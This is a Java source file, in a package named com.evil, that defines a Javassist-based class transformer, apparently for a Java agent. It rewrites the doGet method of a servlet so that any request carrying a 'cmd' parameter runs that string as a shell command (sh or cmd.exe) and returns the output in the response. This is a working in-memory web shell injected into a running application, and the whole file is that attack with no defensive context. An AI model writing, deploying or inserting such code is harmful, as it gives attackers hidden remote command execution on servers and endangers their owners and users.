package com.evil;

import javassist.*;

import java.io.IOException;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

public class Transformer implements ClassFileTransformer {
    public static final String ClassName = "com.index.IndexServlet";

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        className = className.replace("/", ".");
        if(className.equals(ClassName)) {
            System.out.println("Got it");
            ClassPool classPool = ClassPool.getDefault();
            ClassClassPath classPath = new ClassClassPath(classBeingRedefined);
            classPool.insertClassPath(classPath);
            try {
                CtClass ctClass = classPool.getCtClass(className);
                CtMethod method = ctClass.getDeclaredMethod("doGet");
                method.insertBefore("java.lang.System.out.println(\"insert success\");\n" +
                        "if (req.getParameter(\"cmd\") != null) {\n" +
                        "   java.lang.String cmd = req.getParameter(\"cmd\");\n" +
                        "   boolean isLinux = true;\n" +
                        "   java.lang.String osType = java.lang.System.getProperty(\"os.name\");\n" +
                        "   if (osType != null && osType.toLowerCase().contains(\"win\")) {\n" +
                        "       isLinux = false;\n" +
                        "   }\n" +
                        "   java.lang.String[] cmds = isLinux ? new java.lang.String[]{\"sh\", \"-c\", cmd} : new java.lang.String[]{\"cmd.exe\", \"/c\", cmd};\n" +
                        "   java.io.InputStream in = java.lang.Runtime.getRuntime().exec(cmds).getInputStream();\n" +
                        "   java.util.Scanner s = new java.util.Scanner(in).useDelimiter(\"\\\\a\");\n" +
                        "   java.lang.String output = s.hasNext() ? s.next() : \"\";\n" +
                        "   java.io.PrintWriter out = resp.getWriter();\n" +
                        "   out.println(output);\n" +
                        "   out.flush();\n" +
                        "   out.close();\n" +
                        "}\n");
                byte[] bytes = ctClass.toBytecode();
                ctClass.detach();
                return bytes;
            } catch (NotFoundException | CannotCompileException | IOException e) {
                e.printStackTrace();
            }
        }
        return new byte[0];
    }
}
